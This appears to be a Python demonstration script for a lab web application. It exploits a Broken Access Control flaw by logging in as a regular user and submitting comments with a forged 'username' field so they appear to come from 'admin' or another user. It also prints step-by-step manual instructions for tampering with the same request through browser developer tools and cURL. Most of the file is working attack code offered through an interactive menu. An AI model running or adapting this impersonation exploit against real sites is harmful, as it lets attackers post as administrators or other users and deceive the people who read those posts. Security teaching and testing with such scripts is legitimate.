#!/usr/bin/env python3
"""
Broken Access Control (BAC) Vulnerability Demonstration Script
Educational purposes only - test on authorized systems only!
"""

import requests
import json

class BACCommentTester:
    def __init__(self, base_url="http://127.0.0.1:5002"):
        self.base_url = base_url
        self.session = requests.Session()
    
    def login_as_user(self, username="john_doe", password="password123"):
        """Login as a regular user"""
        print(f"🔐 Logging in as {username}...")
        
        response = self.session.post(f"{self.base_url}/login", 
                                   data={"username": username, "password": password})
        
        if response.status_code == 200 and "dashboard" in response.url:
            print(f"✅ Successfully logged in as {username}")
            return True
        else:
            print(f"❌ Login failed for {username}")
            return False
    
    def post_legitimate_comment(self, product_id=1):
        """Post a legitimate comment as the logged-in user"""
        print(f"\n📝 Posting legitimate comment...")
        
        comment_data = {
            "product_id": product_id,
            "comment": "This is a legitimate comment from a regular user.",
            "username": "john_doe"  # Normal username
        }
        
        response = self.session.post(f"{self.base_url}/add_comment", data=comment_data)
        
        if response.status_code == 200:
            print("✅ Legitimate comment posted successfully")
            return True
        else:
            print(f"❌ Failed to post legitimate comment: {response.status_code}")
            return False
    
    def exploit_bac_impersonate_admin(self, product_id=1):
        """Exploit BAC vulnerability to impersonate admin"""
        print(f"\n🚨 EXPLOITING BAC VULNERABILITY - Impersonating admin...")
        
        # Malicious payload impersonating admin
        malicious_data = {
            "product_id": product_id,
            "comment": "🔥 ADMIN ALERT: This comment was posted by impersonating the admin user! This demonstrates a critical Broken Access Control vulnerability.",
            "username": "admin"  # IMPERSONATION ATTACK!
        }
        
        response = self.session.post(f"{self.base_url}/add_comment", data=malicious_data)
        
        if response.status_code == 200:
            print("🎯 BAC EXPLOIT SUCCESS! Comment posted as admin!")
            print("🚨 CRITICAL: Regular user successfully impersonated administrator")
            return True
        else:
            print(f"❌ BAC exploit failed: {response.status_code}")
            return False
    
    def exploit_bac_impersonate_other_user(self, product_id=1, target_user="jane_smith"):
        """Exploit BAC vulnerability to impersonate another user"""
        print(f"\n👤 EXPLOITING BAC VULNERABILITY - Impersonating {target_user}...")
        
        # Malicious payload impersonating another user
        malicious_data = {
            "product_id": product_id,
            "comment": f"This comment appears to be from {target_user}, but it's actually posted by john_doe through BAC vulnerability exploitation!",
            "username": target_user  # IMPERSONATION ATTACK!
        }
        
        response = self.session.post(f"{self.base_url}/add_comment", data=malicious_data)
        
        if response.status_code == 200:
            print(f"🎯 BAC EXPLOIT SUCCESS! Comment posted as {target_user}!")
            print(f"🚨 CRITICAL: Successfully impersonated {target_user}")
            return True
        else:
            print(f"❌ BAC exploit failed: {response.status_code}")
            return False
    
    def verify_comments(self, product_id=1):
        """Verify the posted comments to see impersonation results"""
        print(f"\n🔍 Verifying comments on product {product_id}...")
        
        response = self.session.get(f"{self.base_url}/product/{product_id}")
        
        if response.status_code == 200:
            # Count admin comments in the response
            admin_comments = response.text.count('admin') + response.text.count('ADMIN')
            jane_comments = response.text.count('jane_smith')
            
            print(f"📊 Page contains {admin_comments} references to admin")
            print(f"📊 Page contains {jane_comments} references to jane_smith")
            
            if "ADMIN ALERT" in response.text:
                print("✅ CONFIRMED: Admin impersonation comment visible on page!")
            if "appears to be from jane_smith" in response.text:
                print("✅ CONFIRMED: User impersonation comment visible on page!")
                
            return True
        else:
            print(f"❌ Failed to verify comments: {response.status_code}")
            return False
    
    def demonstrate_full_bac_attack(self):
        """Demonstrate complete BAC attack scenario"""
        print("🔥 BAC VULNERABILITY DEMONSTRATION")
        print("=" * 60)
        print("This script demonstrates how a regular user can impersonate")
        print("any user including administrators through Broken Access Control")
        print("=" * 60)
        
        # Step 1: Login as regular user
        if not self.login_as_user():
            return False
        
        # Step 2: Post legitimate comment
        self.post_legitimate_comment()
        
        # Step 3: Exploit BAC to impersonate admin
        self.exploit_bac_impersonate_admin()
        
        # Step 4: Exploit BAC to impersonate another user
        self.exploit_bac_impersonate_other_user()
        
        # Step 5: Verify the attack worked
        self.verify_comments()
        
        print("\n" + "=" * 60)
        print("🎯 BAC VULNERABILITY DEMONSTRATION COMPLETE!")
        print("=" * 60)
        print("🔧 Manual Testing Instructions:")
        print("1. Visit any product page while logged in")
        print("2. Open browser developer tools (F12)")
        print("3. Go to Network tab")
        print("4. Submit a comment")
        print("5. Find the POST /add_comment request")
        print("6. Right-click → Copy → Copy as cURL")
        print("7. Modify 'username=current_user' to 'username=admin'")
        print("8. Execute the modified request")
        print("9. Refresh the page to see your comment posted as admin!")
        
        return True

def main():
    print("🔓 BROKEN ACCESS CONTROL (BAC) VULNERABILITY TESTER")
    print("Educational purposes only - test on authorized systems only!")
    
    base_url = input("Enter base URL (default: http://127.0.0.1:5002): ").strip()
    if not base_url:
        base_url = "http://127.0.0.1:5002"
    
    tester = BACCommentTester(base_url)
    
    print("\nSelect test option:")
    print("1. Demonstrate admin impersonation")
    print("2. Demonstrate user impersonation") 
    print("3. Full BAC attack demonstration")
    print("4. Just show manual testing instructions")
    
    choice = input("Choice (1-4): ").strip()
    
    if choice == "1":
        if tester.login_as_user():
            tester.exploit_bac_impersonate_admin()
            tester.verify_comments()
    elif choice == "2":
        if tester.login_as_user():
            tester.exploit_bac_impersonate_other_user()
            tester.verify_comments()
    elif choice == "3":
        tester.demonstrate_full_bac_attack()
    elif choice == "4":
        print("\n🔧 MANUAL BAC TESTING INSTRUCTIONS:")
        print("=" * 50)
        print("1. Login to the vulnerable lab")
        print("2. Navigate to any product page")
        print("3. Open browser dev tools (F12)")
        print("4. Go to Network tab")
        print("5. Write a comment and submit")
        print("6. Find the POST /add_comment request")
        print("7. Right-click → Copy → Copy as cURL")
        print("8. Modify the request:")
        print("   Change: username=your_user")
        print("   To: username=admin")
        print("9. Execute the modified cURL command")
        print("10. Refresh the page to see impersonation!")
        print("\n🎯 This demonstrates how users can post as any user!")
    else:
        print("Invalid choice. Running full demonstration...")
        tester.demonstrate_full_bac_attack()

if __name__ == "__main__":
    main()
